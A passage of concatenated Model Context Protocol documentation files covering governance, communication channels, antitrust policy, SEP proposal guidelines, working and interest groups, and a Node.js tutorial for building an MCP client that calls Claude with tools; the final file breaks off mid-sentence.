**maintainer** group the individual has to demonstrate strong and continued alignment with the overall MCP principles.\n- No term limits for module maintainers or core maintainers\n- Light criteria of moving working-group or sub-project maintenance to 'emeritus' status if they don't actively participate over long periods of time. Each maintainer group may define the inactive period that's appropriate for their area.\n- The membership is for an individual, not a company.\n\n### Nomination and Removal\n\n- Core Maintainers are responsible for adding and removing maintainers. They will take the consideration of existing maintainers into account.\n- The lead maintainers are responsible for adding and removing core maintainers.\n\n#### Nomination Process\n\nIf a Maintainer (or Core / Lead Maintainer) wishes to propose a nomination for the Core / Lead Maintainers’ consideration, they should follow the following process:\n\n1. Collect evidence for the nomination. This will generally come in the form of a history of merged PRs on the repositories for which maintainership is being considered.\n2. Discuss among maintainers of the relevant group(s) as to whether they would be supportive of approving the nomination.\n3. DM a Community Moderator or Core Maintainer to create a private channel in Discord, in the format `nomination-{name}-{group}`. Add all core maintainers, lead maintainers, and co-maintainers on the relevant group.\n4. Provide context for the individual under nomination. See below for suggestions on what to include here.\n5. Create a Discord Poll and ask Core / Lead Maintainers to vote Yes / No on the nomination. Reaching consensus is encouraged though not required.\n6. After Core / Lead Maintainers discuss and/or vote, if the nomination is favorable, relevant members with permissions to update GitHub an Discord roles will add the nominee to the appropriate groups. The nominator should announce the new maintainership in the relevant Discord channel.\n7. The temporary Discord channel will be deleted a week later.\n\nSuggestions for the kind of information to share with core maintainers when nominating someone:\n\n- GitHub profile link, LinkedIn profile link, Discord username\n- For what group(s) are you nominating the individual for maintainership\n- Whether the group(s) agree that this person should be elevated to maintainership\n- Description of their contributions to date (including links to most substantial contributions)\n- Description of expected contributions moving forward (e.g. Are they eager to be a maintainer? Will they have capacity to do so?)\n- Other context about the individual (e.g. current employer, motivations behind MCP involvement)\n- Anything else you think may be relevant to consider for the nomination\n\n## Current Core Maintainers\n\n- Inna Harper\n- Basil Hosmer\n- Paul Carleton\n- Nick Cooper\n- Nick Aldridge\n- Che Liu\n- Den Delimarsky\n\n## Current Maintainers and Working Groups\n\nRefer to [the maintainer list](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/MAINTAINERS.md).\n"}

We expect all participants to maintain respectful, professional, and inclusive interactions across all channels.\n\n### Discord\n\nFor real-time contributor discussion and collaboration. The server is designed around **MCP contributors** and is not intended\nto be a place for general MCP support.\n\nThe Discord server will have both public and private channels.\n\n[Join the Discord server here][discord-join].\n\n#### Public Channels (Default)\n\n- **Purpose**: Open community engagement, collaborative development, and transparent project coordination.\n- Primary use cases:\n  - **Public SDK and tooling development**: All development, from ideation to release planning, happens in public channels (e.g., `#typescript-sdk-dev`, `#inspector-dev`).\n  - **[Working and Interest Group](/community/working-interest-groups) discussions**\n  - **Community onboarding** and contribution guidance.\n  - **Community feedback** and collaborative brainstorming.\n  - Public **office hours** and **maintainer availability**.\n- Avoid:\n  - MCP user support: participants are expected to read official documentation and start new GitHub Discussions for questions or support.\n  - Service or product marketing: interactions on this Discord are expected to be vendor-neutral and not used for brand-building or sales. Mentions of brands or products are discouraged outside of being used as examples or responses to conversations that start off focused on the specification.\n\n#### Private channels (Exceptions)\n\n- **Purpose**: Confidential coordination and sensitive matters that cannot be discussed publicly. Access will be restricted to designated maintainers.\n- **Strict criteria for private use**:\n  - **Security incidents** (CVEs, protocol vulnerabilities).\n  - **People matters** (maintainer-related discussions, code of conduct policies).\n  - Select channels will be configured to be **read-only**. This can be good for example for maintainer decision making.\n  - Coordination requiring **immediate** or otherwise **focused response** with a limited audience.\n- **Transparency**:\n  - **All technical and governance decisions** affecting the community **must be documented** in GitHub Discussions and/or Issues, and will be labeled with `notes`.\n  - **Some matters related to individual contributors** may remain private when appropriate (e.g., personal circumstances, disciplinary actions, or other sensitive individual matters).\n  - Private channels are to be used as **temporary \"incident rooms,\"** not for routine development.\n\nAny significant discussion on Discord that leads to a potential decision or proposal must be moved to a GitHub Discussion or GitHub Issue to create a persistent, searchable record. Proposals will then be promoted to full-fledged PRs with associated work items (GitHub Issues) as needed.\n\n### GitHub Discussions\n\nFor structured, long-form discussion and debate on project direction, features, improvements, and community topics.\n\nWhen to use:\n\n- Project roadmap planning and milestone discussions\n- Announcements and release communications\n- Community polls and consensus-building processes\n- Feature requests with context and rationale\n  - If a particular repository does not have GitHub Discussions enabled, feel free to open a GitHub Issue instead.\n\n### GitHub Issues\n\nFor bug reports, feature tracking, and actionable development tasks.\n\nWhen to use:\n\n- Bug reports with reproducible steps\n- Documentation improvements with specific scope\n- CI/CD problems and infrastructure issues\n- Release tasks and milestone tracking\n\n**Note**: SEP proposals are submitted as pull requests to the [`seps/` directory](https://github.com/modelcontextprotocol/specification/tree/main/seps), not as GitHub Issues. See the [SEP guidelines](./sep-guidelines) for details.\n\n### Security Issues\n\n**Do not post security issues publicly.** Instead:\n\n1. Use the private security reporting process. For protocol-level security issues, follow the process in [SECURITY.md in the modelcontextprotocol GitHub repository](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/SECURITY.md).\n2. Contact lead and/or [core maintainers](./governance#current-core-maintainers) directly.\n3. Follow responsible disclosure guidelines.\n\n## Decision Records\n\nAll MCP decisions are documented and captured in public channels.\n\n- **Technical decisions**: [GitHub Issues](https://github.com/modelcontextprotocol/modelcontextprotocol/issues) and [SEPs](https://github.com/modelcontextprotocol/specification/tree/main/seps).\n- **Specification changes**: [On the Model Context Protocol website](https://modelcontextprotocol.io/specification/draft/changelog).\n- **Process changes**: [Community documentation](https://modelcontextprotocol.io/community/governance).\n- **Governance decisions and updates**: [GitHub Issues](https://github.com/modelcontextprotocol/modelcontextprotocol/issues) and [SEPs](https://github.com/modelcontextprotocol/specification/tree/main/seps).\n\nWhen documenting decisions, we will retain as much context as possible:\n\n- Decision makers\n- Background context and motivation\n- Options that were considered\n- Rationale for the chosen approach\n- Implementation steps\n\n[discord-join]: https://discord.gg/6CSzBmMkjX\n"}

The purpose of this Antitrust Policy (the \"Policy\") is to avoid antitrust risks in carrying out this pro-competitive mission.\n\nParticipants in and contributors to the Project (collectively, \"participants\") will use their best reasonable efforts to comply in all respects with all applicable state and federal antitrust and trade regulation laws, and applicable antitrust/competition laws of other countries (collectively, the \"Antitrust Laws\").\n\nThe goal of Antitrust Laws is to encourage vigorous competition. Nothing in this Policy prohibits or limits the ability of participants to make, sell or use any product, or otherwise to compete in the marketplace. This Policy provides general guidance on compliance with Antitrust Law. Participants should contact their respective legal counsel to address specific questions.\n\nThis Policy is conservative and is intended to promote compliance with the Antitrust Laws, not to create duties or obligations beyond what the Antitrust Laws actually require. In the event of any inconsistency between this Policy and the Antitrust Laws, the Antitrust Laws preempt and control.\n\n## Participation\n\nTechnical participation in the Project shall be open to all, subject only to compliance with the provisions of the Project's charter and other governance documents.\n\n## Conduct of Meetings\n\nAt meetings among actual or potential competitors, there is a risk that participants in those meetings may improperly disclose or discuss information in violation of the Antitrust Laws or otherwise act in an anti-competitive manner. To avoid this risk, participants must adhere to the following policies when participating in Project-related or sponsored meetings, conference calls, or other forums (collectively, \"Project Meetings\").\n\nParticipants must not, in fact or appearance, discuss or exchange information regarding:\n\n- An individual company's current or projected prices, price changes, price differentials, markups, discounts, allowances, terms and conditions of sale, including credit terms, etc., or data that bear on prices, including profits, margins or cost.\n- Industry-wide pricing policies, price levels, price changes, differentials, or the like.\n- Actual or projected changes in industry production, capacity or inventories.\n- Matters relating to bids or intentions to bid for particular products, procedures for responding to bid invitations or specific contractual arrangements.\n- Plans of individual companies concerning the design, characteristics, production, distribution, marketing or introduction dates of particular products, including proposed territories or customers.\n- Matters relating to actual or potential individual suppliers that might have the effect of excluding them from any market or of influencing the business conduct of firms toward such suppliers.\n- Matters relating to actual or potential customers that might have the effect of influencing the business conduct of firms toward such customers.\n- Individual company current or projected cost of procurement, development or manufacture of any product.\n- Individual company market shares for any product or for all products.\n- Confidential or otherwise sensitive business plans or strategy.\n\nIn connection with all Project Meetings, participants must do the following:\n\n- Adhere to prepared agendas.\n- Insist that meeting minutes be prepared and distributed to all participants, and that meeting minutes accurately reflect the matters that transpired.\n- Consult with their respective counsel on all antitrust questions related to Project Meetings.\n- Protest against any discussions that appear to violate these policies or the Antitrust Laws, leave any meeting in which such discussions continue, and either insist that such protest be noted in the minutes.\n\n## Requirements/Standard Setting\n\nThe Project may establish standards, technical requirements and/or specifications for use (collectively, \"requirements\"). Participants shall not enter into agreements that prohibit or restrict any participant from establishing or adopting any other requirements. Participants shall not undertake any efforts, directly or indirectly, to prevent any firm from manufacturing, selling, or supplying any product not conforming to a requirement.\n\nThe Project shall not promote standardization of commercial terms, such as terms for license and sale.\n\n## Contact Information\n\nTo contact the Project regarding matters addressed by this Antitrust Policy, please send an email to antitrust@modelcontextprotocol.io, and reference \"Antitrust Policy\" in the subject line.\n"}
{"source":"github","repo":"mcp-spec","path":"docs/community/sep-guidelines.mdx","content":"---\ntitle: SEP Guidelines\ndescription: Specification Enhancement Proposal (SEP) guidelines for proposing changes to the Model Context Protocol\n---\n\n## What is a SEP?\n\nSEP stands for Specification Enhancement Proposal. A SEP is a design document providing information to the MCP community, or describing a new feature for the Model Context Protocol or its processes or environment. The SEP should provide a concise technical specification of the feature and a rationale for the feature.\n\nWe intend SEPs to be the primary mechanisms for proposing major new features, for collecting community input on an issue, and for documenting the design decisions that have gone into MCP. The SEP author is responsible for building consensus within the community and documenting dissenting opinions.\n\nSEPs are maintained as markdown files in the [`seps/` directory](https://github.com/modelcontextprotocol/specification/tree/main/seps) of the specification repository. Their revision history serves as the historical record of the feature proposal.\n\n## What qualifies as a SEP?\n\nThe goal is to reserve the SEP process for changes that are substantial enough to require broad community discussion, a formal design document, and a historical record of the decision-making process. A regular GitHub pull request is often more appropriate for smaller, more direct changes.\n\nConsider proposing a SEP if your change involves any of the following:\n\n- **A New Feature or Protocol Change**: Any change that adds, modifies, or removes features in the Model Context Protocol. This includes:\n  - Adding new API endpoints or methods.\n  - Changing the syntax or semantics of existing data structures or messages.\n  - Introducing a new standard for interoperability between different MCP-compatible tools.\n  - Significant changes to how the specification itself is defined, presented, or validated.\n- **A Breaking Change**: Any change that is not backwards-compatible.\n- **A Change to Governance or Process**: Any proposal that alters the project's decision-making, contribution guidelines (like this document itself).\n- **A Complex or Controversial Topic**: If a change is likely to have multiple valid solutions or generate significant debate, the SEP process provides the necessary framework to explore alternatives, document the rationale, and build community consensus before implementation begins.\n\n## SEP Types\n\nThere are three kinds of SEP:\n\n1. **Standards Track** SEP describes a new feature or implementation for the Model Context Protocol. It may also describe an interoperability standard that will be supported outside the core protocol specification.\n2. **Informational** SEP describes a Model Context Protocol design issue, or provides general guidelines or information to the MCP community, but does not propose a new feature. Informational SEPs do not necessarily represent an MCP community consensus or recommendation.\n3. **Process** SEP describes a process surrounding MCP, or proposes a change to (or an event in) a process. Process SEPs are like Standards Track SEPs but apply to areas other than the MCP protocol itself.\n\n## Submitting a SEP\n\nThe SEP process begins with a new idea for the Model Context Protocol. It is highly recommended that a single SEP contain a single key proposal or new idea. Small enhancements or patches often don't need a SEP and can be injected into the MCP development workflow with a pull request to the MCP repo. The more focused the SEP, the more successful it tends to be.\n\nEach SEP must have an **SEP author** -- someone who writes the SEP using the style and format described below, shepherds the discussions in the appropriate forums, and attempts to build community consensus around the idea. The SEP author should first attempt to ascertain whether the idea is SEP-able. Posting to the MCP community forums (Discord, GitHub Discussions) is the best way to go about this.\n\n### SEP Workflow\n\nSEPs are submitted as pull requests to the [`seps/` directory](https://github.com/modelcontextprotocol/specification/tree/main/seps) in the specification repository. The standard SEP workflow is:\n\n1. **Draft your SEP** as a markdown file named `0000-your-feature-title.md`, using `0000` as a placeholder for the SEP number. Follow the [SEP format](#sep-format) described below.\n\n2. **Create a pull request** adding your SEP file to the `seps/` directory in the [specification repository](https://github.com/modelcontextprotocol/specification).\n\n3. **Update the SEP number**: Once your PR is created, amend your commit to rename the file using the PR number (e.g., PR #1850 becomes `1850-your-feature-title.md`) and update the SEP header to reference the correct number.\n\n4. **Find a Sponsor**: Tag a Core Maintainer or Maintainer from [the maintainer list](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/MAINTAINERS.md) in your PR to request sponsorship. Maintainers regularly review open proposals to determine which to sponsor.\n\n5. **Sponsor assigns themselves**: Once a sponsor agrees, they will assign themselves to the PR and update the SEP status to `draft` in the markdown file.\n\n6. **Informal review**: The sponsor reviews the proposal and may request changes based on community feedback. Discussion happens in the PR comments.\n\n7. **Formal review**: When the SEP is ready, the sponsor updates the status to `in-review`. The SEP enters formal review by the Core Maintainers team.\n\n8. **Resolution**: The SEP may be `accepted`, `rejected`, or returned for revision. The sponsor updates the status accordingly.\n\n9. **Finalization**: Once accepted, the reference implementation must be completed. When complete and incorporated into the specification, the sponsor updates the status to `final`.\n\nIf a SEP has not found a sponsor within six months, Core Maintainers may close the PR and mark the SEP as `dormant`.\n\n### SEP Format\n\nEach SEP should have the following parts:\n\n1. **Preamble** -- A short descriptive title, the names and contact info for each author, the current status, SEP type, and PR number.\n2. **Abstract** -- A short (~200 word) description of the technical issue being addressed.\n3. **Motivation** -- The motivation should clearly explain why the existing protocol specification is inadequate to address the problem that the SEP solves. The motivation is critical for SEPs that want to change the Model Context Protocol. SEP submissions without sufficient motivation may be rejected outright.\n4. **Specification** -- The technical specification should describe the syntax and semantics of any new protocol feature. The specification should be detailed enough to allow competing, interoperable implementations.\n5. **Rationale** -- The rationale explains why particular design decisions were made. It should describe alternate designs that were considered and related work. The rationale should provide evidence of consensus within the community and discuss important objections or concerns raised during discussion.\n6. **Backward Compatibility** -- All SEPs that introduce backward incompatibilities must include a section describing these incompatibilities and their severity. The SEP must explain how the author proposes to deal with these incompatibilities.\n7. **Reference Implementation** -- The reference implementation must be completed before any SEP is given status \"Final\", but it need not be completed before the SEP is accepted. While there is merit to the approach of reaching consensus on the specification and rationale before writing code, the principle of \"rough consensus and running code\" is still useful when it comes to resolving many discussions of protocol details.\n8. **Security Implications** -- If there are security concerns in relation to the SEP, those concerns should be explicitly written out to make sure reviewers of the SEP are aware of them.\n\nSee the [SEP template](https://github.com/modelcontextprotocol/specification/blob/main/seps/README.md#sep-file-structure) for the complete file structure.\n\n### SEP States\n\nSEPs can be in one of the following states:\n\n- `draft`: SEP proposal with a sponsor, undergoing informal review.\n- `in-review`: SEP proposal ready for formal review by Core Maintainers.\n- `accepted`: SEP accepted by Core Maintainers, but still requires final wording and reference implementation.\n- `rejected`: SEP rejected by Core Maintainers.\n- `withdrawn`: SEP withdrawn by the author.\n- `final`: SEP finalized with reference implementation complete.\n- `superseded`: SEP has been replaced by a newer SEP.\n- `dormant`: SEP that has not found a sponsor and was subsequently closed.\n\n### Status Management\n\n**The Sponsor is responsible for updating the SEP status.** This ensures that status transitions are made by someone with the authority and context to do so appropriately. The sponsor:\n\n1. Updates the `Status` field directly in the SEP markdown file\n2. Applies matching labels to the pull request (e.g., `draft`, `in-review`, `accepted`)\n\nBoth the markdown status field and PR labels should be kept in sync. The markdown file serves as the canonical record (versioned with the proposal), while PR labels make it easy to filter and search for SEPs by status.\n\nAuthors should request status changes through their sponsor rather than modifying the status field or labels themselves.\n\n### SEP Review & Resolution\n\nSEPs are reviewed by the MCP Core Maintainers team on a bi-weekly basis.\n\nFor a SEP to be accepted it must meet certain minimum criteria:\n\n- A prototype implementation demonstrating the proposal\n- Clear benefit to the MCP ecosystem\n- Community support and consensus\n\nOnce a SEP has been accepted, the reference implementation must be completed. When the reference implementation is complete and incorporated into the main source code repository, the status will be changed to \"Final\".\n\nA SEP can also be \"Rejected\" or \"Withdrawn\". A SEP that is \"Withdrawn\" may be re-submitted at a later date.\n\n## The Sponsor Role\n\nA Sponsor is a Core Maintainer or Maintainer who champions the SEP through the review process. The sponsor's responsibilities include:\n\n- Reviewing the proposal and providing constructive feedback\n- Requesting changes based on community input\n- **Updating the SEP status** as the proposal progresses through the workflow\n- Initiating formal review when the SEP is ready\n- Presenting and discussing the proposal at Core Maintainer meetings\n- Ensuring the proposal meets quality standards\n\n## Reporting SEP Bugs, or Submitting SEP Updates\n\nHow you report a bug, or submit a SEP update depends on several factors, such as the maturity of the SEP, the preferences of the SEP author, and the nature of your comments. For SEPs not yet reaching `final` state, it's probably best to comment directly on the SEP's pull request. Once a SEP is finalized and merged, you may submit updates by creating a new pull request that modifies the SEP file.\n\n## Transferring SEP Ownership\n\nIt occasionally becomes necessary to transfer ownership of SEPs to a new SEP author. In general, we'd like to retain the original author as a co-author of the transferred SEP, but that's really up to the original author. A good reason to transfer ownership is because the original author no longer has the time or interest in updating it or following through with the SEP process, or has fallen off the face of the 'net (i.e. is unreachable or not responding to email). A bad reason to transfer ownership is because you don't agree with the direction of the SEP. We try to build consensus around a SEP, but if that's not possible, you can always submit a competing SEP.\n\n## Copyright\n\nThis document is placed in the public domain or under the CC0-1.0-Universal license, whichever is more permissive.\n"}

The primary focus is on identifying and gathering problems that may be worth addressing through SEPs or other community artifacts, while encouraging open exploration of protocol issues and opportunities.\n\n**Expectations**:\n\n- Regular conversations in the Interest Group Discord channel\n- **AND/OR** a recurring live meeting regularly attended by Interest Group members\n- Meeting dates and times published in advance on the [MCP community calendar](https://meet.modelcontextprotocol.io/) when applicable, and tagged with their primary topic and interest group Discord channel name (e.g. `auth-ig`)\n- Notes publicly shared after meetings, as a GitHub issue ([example](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1629)) and/or public Google Doc\n\n**Examples**:\n\n- Security in MCP\n- Auth in MCP\n- Using MCP in enterprise settings\n- Tooling and practices surrounding hosting MCP servers\n- Tooling and practices surrounding implementing MCP clients\n\n**Lifecycle**:\n\n- Creation begins by filling out a template in the \\#wg-ig-group-creation [Discord](/community/communication#discord) channel\n- A community moderator will review and call for a vote in the (private) \\#community-moderators Discord channel. Majority positive vote by members over a 72h period approves creation of the group.\n  - The creation of the group can be reversed at any time (e.g., after new information surfaces). Core and lead maintainers can veto.\n- Facilitator(s) and Maintainer(s) responsible for organizing IG into meeting expectations\n  - Facilitator is an informal role responsible for shepherding or speaking for a group\n  - Maintainer is an official representative from the MCP steering group. A maintainer is not required for every group, but can help advocate for specific changes or initiatives.\n- IG is retired only when community moderators or Core or Lead Maintainers determine it's no longer active and/or needed\n  - Successful IGs do not have a time limit or expiration date - as long as they are active and maintained, they will remain available\n\n**Creation Template**:\n\n- Facilitator(s)\n- Maintainer(s) (optional)\n- IGs with potentially similar goals/discussions\n- How this IG differentiates itself from the related IGs\n- First topic you to discuss within the IG\n\nParticipation in an Interest Group (IG) is not required to start a Working Group (WG) or to create a SEP. However, building consensus within IGs can be valuable when justifying the formation of a WG. Likewise, referencing support from IGs or WGs can strengthen a SEP and its chances of success.\n\n### Working Groups (WG)\n\n**Goal:** Facilitate collaboration within the MCP community on a SEP, a themed series of SEPs, or an otherwise officially endorsed project.\n\n**Expectations**:\n\n- Meaningful progress towards at least one SEP or spec-related implementation **OR** hold maintenance responsibilities for a project (e.g., Inspector, Registry, SDKs)\n- Facilitators are responsible for keeping track of progress and communicating status when appropriate\n- Meeting dates and times published in advance on the [MCP community calendar](https://meet.modelcontextprotocol.io/) when applicable, and tagged with their primary topic and working group Discord channel name (e.g. `agents-wg`)\n- Notes publicly shared after meetings, as a GitHub issue ([example](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1629)) and/or public Google Doc\n\n**Examples**:\n\n- Registry\n- Inspector\n- Tool Filtering\n- Server Identity\n\n**Lifecycle**:\n\n- Creation begins by filling out a template in \\#wg-ig-group-creation Discord channel\n- A community moderator will review and call for a vote in the (private) \\#community-moderators Discord channel. Majority positive vote by members over a 72h period approves creation of the group.\n  - The creation of the group can be reversed at any time (e.g., after new information surfaces). Core and lead maintainers can veto.\n- Facilitator(s) and Maintainer(s) responsible for organizing WG into meeting expectations\n  - Facilitator is an informal role responsible for shepherding or speaking for a group\n  - Maintainer is an official representative from the MCP steering group. A maintainer is not required for every group, but can help advocate for specific changes or initiatives\n- WG is retired when either:\n  - Community moderators or Core and Lead Maintainers decide it is no longer active and/or needed\n  - The WG no longer has an active Issue/PR for a month or more, or has completed all Issues/PRs it intended to pursue.\n\n**Creation Template**:\n\n- Facilitator(s)\n- Maintainer(s) (optional)\n- Explanation of interest/use cases, ideally originating from an IG discussion; however that is not a requirement\n- First Issue/PR/SEP that the WG will work on\n\n## WG/IG Facilitators\n\nA **Facilitator** role in a WG or IG does _not_ result in a [maintainership role](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/MAINTAINERS.md) across the MCP organization. It is an informal role into which anyone can self-nominate.\n\nA Facilitator is responsible for helping shepherd discussions and collaboration within an Interest or Working Group.\n\nLead and Core Maintainers reserve the right to modify the list of Facilitators and Maintainers for any WG/IG at any time.\n\n## FAQ\n\n### How do I get involved contributing to MCP?\n\nThese IG and WG abstractions help provide an elegant on-ramp:\n\n1. [Join the Discord](/community/communication#discord) and follow conversations in IGs relevant to you. Attend [live calls](https://meet.modelcontextprotocol.io/). Participate.\n2. Offer to facilitate calls. Contribute your use cases in SEP proposals and other work.\n3. When you're comfortable contributing to deliverables, jump in to contribute to WG work.\n4. Active and valuable contributors will be nominated by WG maintainers as new maintainers.\n\n### Where can I find a list of all current WGs and IGs?\n\nOn the [MCP Contributor Discord](/community/communication#discord) there is a section of channels for each Working and Interest Group.\n"}
{"source":"github","repo":"mcp-spec","path":"docs/tutorials/building-a-client-node.mdx","content":"<Tab title=\"Node\">\n\n## System Requirements\n\nBefore starting, ensure your system meets these requirements:\n\n- Mac or Windows computer\n- Node.js version 16 or higher installed\n- npm (comes with Node.js)\n\n## Setting Up Your Environment\n\nFirst, create a new Node.js project:\n\n```bash\n# Create project directory\nmkdir mcp-client\ncd mcp-client\n\n# Initialize npm project\nnpm init -y\n\n# Install dependencies\nnpm install @modelcontextprotocol/sdk @anthropic-ai/sdk dotenv\nnpm install -D typescript @types/node\n\n# Create TypeScript config\nnpx tsc --init\n\n# Create necessary files\nmkdir src\ntouch src/client.ts\ntouch .env\n```\n\nUpdate your `package.json` to add necessary configuration:\n\n```json\n{\n  \"type\": \"module\",\n  \"scripts\": {\n    \"build\": \"tsc\",\n    \"start\": \"node build/client.js\"\n  }\n}\n```\n\nUpdate your `tsconfig.json` with appropriate settings:\n\n```json\n{\n  \"compilerOptions\": {\n    \"target\": \"ES2022\",\n    \"module\": \"Node16\",\n    \"moduleResolution\": \"Node16\",\n    \"outDir\": \"./build\",\n    \"rootDir\": \"./src\",\n    \"strict\": true,\n    \"esModuleInterop\": true,\n    \"skipLibCheck\": true,\n    \"forceConsistentCasingInFileNames\": true\n  },\n  \"include\": [\"src/**/*\"]\n}\n```\n\n## Setting Up Your API Key\n\nYou'll need an Anthropic API key from the [Anthropic Console](https://console.anthropic.com/settings/keys).\n\nCreate a `.env` file:\n\n```bash\nANTHROPIC_API_KEY=your_key_here\n```\n\nAdd `.env` to your `.gitignore`:\n\n```bash\necho \".env\" >> .gitignore\n```\n\n## Creating the Client\n\nFirst, let's set up our imports and create the basic client class in `src/client.ts`:\n\n```typescript\nimport { Client } from \"@modelcontextprotocol/sdk/client/index.js\";\nimport { StdioClientTransport } from \"@modelcontextprotocol/sdk/client/stdio.js\";\nimport Anthropic from \"@anthropic-ai/sdk\";\nimport dotenv from \"dotenv\";\nimport {\n  CallToolResultSchema,\n  ListToolsResultSchema,\n} from \"@modelcontextprotocol/sdk/types.js\";\nimport * as readline from \"node:readline\";\n\ndotenv.config();\n\ninterface MCPClientConfig {\n  name?: string;\n  version?: string;\n}\n\nclass MCPClient {\n  private client: Client | null = null;\n  private anthropic: Anthropic;\n  private transport: StdioClientTransport | null = null;\n\n  constructor(config: MCPClientConfig = {}) {\n    this.anthropic = new Anthropic();\n  }\n\n  // Methods will go here\n}\n```\n\n## Server Connection Management\n\nNext, implement the method to connect to an MCP server:\n\n```typescript\n  async connectToServer(serverScriptPath: string): Promise<void> {\n    const isPython = serverScriptPath.endsWith(\".py\");\n    const isJs = serverScriptPath.endsWith(\".js\");\n\n    if (!isPython && !isJs) {\n      throw new Error(\"Server script must be a .py or .js file\");\n    }\n\n    const command = isPython ? \"python\" : \"node\";\n\n    this.transport = new StdioClientTransport({\n      command,\n      args: [serverScriptPath],\n    });\n\n    this.client = new Client(\n      {\n        name: \"mcp-client\",\n        version: \"1.0.0\",\n      },\n      {\n        capabilities: {},\n      }\n    );\n\n    await this.client.connect(this.transport);\n\n    // List available tools\n    const response = await this.client.request(\n      { method: \"tools/list\" },\n      ListToolsResultSchema\n    );\n\n    console.log(\n      \"\\nConnected to server with tools:\",\n      response.tools.map((tool: any) => tool.name)\n    );\n  }\n```\n\n## Query Processing Logic\n\nNow add the core functionality for processing queries and handling tool calls:\n\n```typescript\n  async processQuery(query: string): Promise<string> {\n    if (!this.client) {\n      throw new Error(\"Client not connected\");\n    }\n\n    // Initialize messages array with user query\n    let messages: Anthropic.MessageParam[] = [\n      {\n        role: \"user\",\n        content: query,\n      },\n    ];\n\n    // Get available tools\n    const toolsResponse = await this.client.request(\n      { method: \"tools/list\" },\n      ListToolsResultSchema\n    );\n\n    const availableTools = toolsResponse.tools.map((tool: any) => ({\n      name: tool.name,\n      description: tool.description,\n      input_schema: tool.inputSchema,\n    }));\n\n    const finalText: string[] = [];\n    let currentResponse = await this.anthropic.messages.create({\n      model: \"claude-sonnet-4-20250514\",\n      max_tokens: 1000,\n      messages,\n      tools: availableTools,\n    });\n\n    // Process the response and any tool calls\n    while (true) {\n      // Add Claude's response to final text and messages\n      for (const content of currentResponse.content) {\n        if (content.type === \"text\") {\n          finalText.push(content.text);\n        } else if (content.type === \"tool_use\") {\n          const toolName = content.name;\n          const toolArgs = content.input;\n\n          // Execute tool call\n          const result = await this.client.request(\n            {\n              method: \"tools/call\",\n              params: {\n                name: toolName,\n                arguments: toolArgs,\n              },\n            },\n            CallToolResultSchema\n          );\n\n          finalText.push(\n            `[Calling tool ${toolName} with args ${JSON.stringify(toolArgs)}]`\n          );\n\n          // Add Claude's response (including tool use) to messages\n          messages.push({\n            role: \"assistant\",\n            content: currentResponse.content,\n          });\n\n          // Add tool result to messages\n          messages.push({\n            role: \"user\",\n            content: [\n              {\n                type: \"tool_result\",\n                tool_use_id: content.id,\n                content: [\n                  { type: \"text\", text: JSON.stringify(result.content) },\n                ],\n              },\n            ],\n          });\n\n          // Get next response from Claude with tool results\n          currentResponse = await this.anthropic.messages.create({\n            model: \"claude-sonnet-4-20250514\",\n            max_tokens: 1000,\n            messages,\n            tools: availableTools,\n          });\n\n          // Add Claude's interpretation of the tool results to final text\n          if (currentResponse.content[0]?.type === \"text\") {\n            finalText.push(currentResponse.content[0].text);\n          }\n\n          // Continue the loop to process any additional tool calls\n          continue;\n        }\n      }\n\n      // If we reach here, there were no tool calls in the response\n      break;\n    }\n\n    return finalText.join(\"\\n\");\n  }\n\n```\n\n## Interactive Chat Interface\n\nAdd the chat loop and cleanup functionality:\n\n```typescript\n  async chatLoop(): Promise<void> {\n    console.log(\"\\nMCP Client Started!\");\n    console.log(\"Type your queries or 'quit' to exit.\");\n\n    // Using Node's readline for console input\n    const rl = readline.createInterface({\n      input: process.stdin,\n      output: process.stdout,\n    });\n\n    const askQuestion = () => {\n      rl.question(\"\\nQuery: \", async (query: string) => {\n        try {\n          if (query.toLowerCase() === \"quit\") {\n            await this.cleanup();\n            rl.close();\n            return;\n          }\n\n          const response = await this.processQuery(query);\n          console.log(\"\\n\" + response);\n          askQuestion();\n        } catch (error) {\n          console.error(\"\\nError:\", error);\n          askQuestion();\n        }\n      });\n    };\n\n    askQuestion();\n  }\n\n  async cleanup(): Promise<void> {\n    if (this.transport) {\n      await this.transport.close();\n    }\n  }\n```\n\n## Main Entry Point\n\nFinally, add the main execution logic outside the class:\n\n```typescript\n// Main execution\nasync function main() {\n  if (process.argv.length < 3) {\n    console.log(\"Usage: ts-node client.ts <path_to_server_script>\");\n    process.exit(1);\n  }\n\n  const client = new MCPClient();\n  try {\n    await client.connectToServer(process.argv[2]);\n    await client.chatLoop();\n  } catch (error) {\n    console.error(\"Error:\", error);\n    await client.cleanup();\n    process.exit(1);\n  }\n}\n\n// Run main if this is the main module\nif (import.meta.url === new URL(process.argv[1], \"file:\").href) {\n  main();\n}\n\nexport default MCPClient;\n```\n\n## Running the Client\n\nTo run your client with any MCP server:\n\n```bash\n# Build the TypeScript code. Make sure to rerun this every time you update `client.ts`!\nnpm run build\n\n# Run the client\nnode build/client.js path/to/server.py  # for Python servers\nnode build/client.js path/to/server.js  # for Node.js servers\n```\n\nThe client will:\n\n1. Connect to the specified server\n2. List available tools\n3. Start an interactive chat session where you can:\n   - Enter queries\n   - See tool executions\n   - Get responses from Claude\n\n## Key Components Explained\n\n#### 1. Client Initialization\n\n- The `MCPClient` class initializes with session management and API clients\n- Sets up the MCP client with basic capabilities\n- Configures the Anthropic client for Claude interactions\n\n#### 2. Server Connection\n\n- Supports both Python and Node.js servers\n- Validates server script type\n- Sets up proper communication channels\n- Lists available tools on connection\n\n#### 3. Query Processing\n\n- Maintains conversation context\n- Handles Claude's responses and tool calls\n- Manages the message flow between Claude and tools\n- Combines results into a coherent response\n\n#### 4. Interactive Interface\n\n- Provides a simple command-line interface\n- Handles user input and displays responses\n- Includes basic error handling\n- Allows graceful exit\n\n#### 5. Resource Management\n\n- Proper cleanup of resources\n- Error handling for connection issues\n- Graceful shutdown procedures\n\n### Common Customization Points\n\n1. **Tool Handling**\n   - Modify `processQuery()` to handle specific tool types\n   - Add custom error handling for tool calls\n   - Implement tool-specific response formatting\n\n2. **Response Processing**\n   - Customize how tool results are formatted\n   - Add response filtering or transformation\n   - Implement custom logging\n\n3. **User Interface**\n   - Add a GUI or web interface\n   - Implement rich console output\n   - Add command history or auto-completion\n\n### Best Practices\n\n1. **Error Handling**\n   - Always 